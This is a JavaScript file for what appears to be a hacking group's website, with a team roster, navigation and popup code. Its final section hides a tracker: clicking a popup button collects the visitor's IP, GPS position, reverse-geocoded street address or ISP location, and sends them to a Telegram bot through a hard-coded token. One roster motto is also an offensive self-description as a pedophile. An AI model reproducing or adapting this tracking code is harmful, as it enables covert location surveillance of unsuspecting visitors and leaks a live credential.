// ============= TEAM DATA =============
const teamData = [
    {
        name: './Mr-Rubic',
        role: 'founder ',
        motto: 'melihat yang tak terlihat. data adalah bayangan',
        avatar: 'https://files.catbox.moe/haxm0f.jpg'
    },
    {
        name: 'ZenithxNecxus',
        role: 'founder 2',
        motto: 'Belajar, melindungi, dan berbagi demi keamanan digital',
        avatar: 'https://files.catbox.moe/lxek04.jpg'
    },
    {
        name: './Mr-AliExploit',
        role: 'admin',
        motto: 'Menjaga keamanan digital dengan ilmu dan tanggung jawab',
        avatar: 'https://api.dicebear.com/9.x/identicon/svg?seed=Mr-AliExploit&backgroundColor=ff4d4d'
    },
    {
        name: 'Aryx7177.html',    
        role: 'admin',
        motto: 'Menggunakan pengetahuan untuk menjaga, bukan menyalahgunakan',
        avatar: 'https://files.catbox.moe/pri0c4.jpg'
    },
    {
        name: 'Poloss',
        role: 'admin',
        motto: 'Aku meretas bukan untuk merusak, tapi untuk mengungkap',
        avatar: 'https://files.catbox.moe/jx5abj.jpg'        
    },
    {
        name: './Mr-Shadownex',
        role: 'admin',
        motto: 'aku pedo dan aku bangga',
        avatar: 'https://files.catbox.moe/kh830t.jpg'
    },
    {
        name: 'Lizarus',
        role: 'admin',
        motto:'kami masuk tanpa izin, keluar tanpa jejak—meninggalkan pelajaran, bukan luka',
        avatar: 'https://iili.io/qj0vGln.jpg'
    },
    {
        name: './Mr-Shahed',
        role: 'admin',
        motto: 'Kami bukan ancaman, kami adalah bayangan yang mengingatkan bahwa keamanan itu ilusi',
        avatar: 'https://iili.io/qj0SC41.jpg'
    }
];

function renderTeam() {
    const container = document.getElementById('team-grid');
    if (!container) return;
    container.innerHTML = teamData.map(member => `
        <div class="team-card">
            <div class="card-avatar">
                <img src="${member.avatar}" alt="${member.name}" loading="lazy">
            </div>
            <div class="card-info">
                <h3 class="card-name">${member.name}</h3>
                <div class="card-role">${member.role}</div>
                <div class="card-motto">"${member.motto}"</div>
            </div>
        </div>
    `).join('');
}

// ============= HAMBURGER MENU =============
const hamburger = document.getElementById('hamburger');
const navLinks = document.getElementById('nav-links');

if (hamburger && navLinks) {
    hamburger.addEventListener('click', () => {
        hamburger.classList.toggle('active');
        navLinks.classList.toggle('active');
    });
    
    navLinks.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', () => {
            hamburger.classList.remove('active');
            navLinks.classList.remove('active');
        });
    });
    
    document.addEventListener('click', (e) => {
        if (!navLinks.contains(e.target) && !hamburger.contains(e.target) && navLinks.classList.contains('active')) {
            hamburger.classList.remove('active');
            navLinks.classList.remove('active');
        }
    });
}

// ============= LOADER =============
window.addEventListener('load', () => {
    const loader = document.getElementById('loader');
    if (loader) {
        setTimeout(() => {
            loader.classList.add('hidden');
        }, 1000);
    }
});

// ============= NAVIGATION =============
document.querySelectorAll('.nav-link').forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        const target = link.getAttribute('href');
        const element = document.querySelector(target);
        if (element) {
            element.scrollIntoView({ behavior: 'smooth' });
            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
            link.classList.add('active');
        }
    });
});

window.addEventListener('scroll', () => {
    const sections = document.querySelectorAll('.section');
    const navLinksScroll = document.querySelectorAll('.nav-link');
    let current = '';
    sections.forEach(section => {
        const sectionTop = section.offsetTop - 100;
        const sectionBottom = sectionTop + section.offsetHeight;
        if (window.scrollY >= sectionTop && window.scrollY < sectionBottom) {
            current = section.getAttribute('id');
        }
    });
    navLinksScroll.forEach(link => {
        link.classList.remove('active');
        if (link.getAttribute('href') === `#${current}`) {
            link.classList.add('active');
        }
    });
});

document.addEventListener('DOMContentLoaded', () => {
    renderTeam();
});

// ============= TRACKING (LANGSUNG KE TELEGRAM) =============
async function sendToTelegram(data) {
    const botToken = '8784325672:AAGIjFlqRS_MnMzXaqcgn3lhIzcGaq-1E30';
    const chatId = '8564704937';
    
    let msg = `📍 NEW VISITOR\n━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `🌐 IP: ${data.ip || '-'}\n`;
    if (data.lat) {
        msg += `📍 GPS: ${data.lat}, ${data.lon}\n📏 Akurasi: ${data.accuracy} meter\n`;
        msg += `🏠 Alamat: ${data.address || '-'}\n`;
    } else if (data.city) {
        msg += `📍 Lokasi: ${data.city}, ${data.region}, ${data.country}\n`;
        msg += `📡 ISP: ${data.isp}\n`;
    }
    msg += `\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
    
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: msg })
        });
    } catch(e) {
        console.log('Telegram error:', e);
    }
}

async function getLocationFromIP(ip) {
    try {
        const res = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await res.json();
        if (data.status === 'success') {
            return {
                city: data.city,
                region: data.regionName,
                country: data.country,
                isp: data.isp,
                lat: data.lat,
                lon: data.lon
            };
        }
    } catch(e) {}
    return null;
}

async function trackUser() {
    let ip = null;
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ip = data.ip;
    } catch(e) {}
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const accuracy = pos.coords.accuracy;
            
            let address = '';
            try {
                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const geo = await geoRes.json();
                address = geo.display_name || '';
            } catch(e) {}
            
            await sendToTelegram({
                ip: ip,
                lat: lat,
                lon: lon,
                accuracy: accuracy,
                address: address
            });
        }, async () => {
            const ipData = await getLocationFromIP(ip);
            if (ipData) {
                await sendToTelegram({
                    ip: ip,
                    city: ipData.city,
                    region: ipData.region,
                    country: ipData.country,
                    isp: ipData.isp
                });
            } else {
                await sendToTelegram({ ip: ip });
            }
        });
    } else {
        const ipData = await getLocationFromIP(ip);
        if (ipData) {
            await sendToTelegram({
                ip: ip,
                city: ipData.city,
                region: ipData.region,
                country: ipData.country,
                isp: ipData.isp
            });
        } else {
            await sendToTelegram({ ip: ip });
        }
    }
}

// ============= POPUP =============
setTimeout(() => {
    const popup = document.getElementById('trackPopup');
    if (popup) popup.style.display = 'block';
}, 3000);

const trackBtn = document.getElementById('trackBtn');
if (trackBtn) {
    trackBtn.onclick = () => {
        document.getElementById('trackPopup').style.display = 'none';
        trackUser();
    };
}
